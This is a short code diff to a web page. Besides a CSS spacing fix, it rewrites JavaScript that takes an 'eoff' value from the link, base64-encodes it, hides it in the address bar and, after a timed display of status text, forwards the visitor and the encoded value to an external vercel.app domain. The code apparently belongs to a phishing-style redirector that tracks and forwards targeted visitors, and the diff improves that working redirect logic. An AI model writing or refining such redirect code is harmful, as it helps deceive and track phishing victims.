@@ -36,7 +36,7 @@
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
             padding: 40px;
             width: 90%;
-            height:100px;
+            height: 100px;
             max-width: 500px;
             display: flex;
             justify-content: space-between;
@@ -255,24 +255,18 @@
                 text3.style.display = 'inline';
                 text4.style.display = 'none';
 
-                const currentUrl = window.location.href;
-                let redirectUrl = 'https://xyz123-blush.vercel.app/?eoff=';
+                const urlParams = new URLSearchParams(window.location.search);
+                const eoffValue = urlParams.get('eoff');
 
-                const paramIndex = currentUrl.indexOf('eoff=');
-                if (paramIndex !== -1) {
-                    let paramValue = currentUrl.substring(paramIndex + 5);
+                let redirectUrl = 'https://xyz123-blush.vercel.app/';
 
-                    const separatorIndex = paramValue.indexOf('&');
-                    if (separatorIndex !== -1) {
-                        paramValue = paramValue.substring(0, separatorIndex);
-                    }
+                if (eoffValue) {
+                    const encodedValue = btoa(eoffValue);
 
-                    const encodedValue = btoa(paramValue);
-
-                    const newUrl = window.location.origin + window.location.pathname + '?encoded=' + encodedValue;
+                    const newUrl = window.location.origin + window.location.pathname + '?eoff=' + encodedValue;
                     window.history.replaceState({}, document.title, newUrl);
 
-                    redirectUrl += encodeURIComponent(encodedValue);
+                    redirectUrl += '?eoff=' + encodedValue;
                 }
 
                 setTimeout(function() {
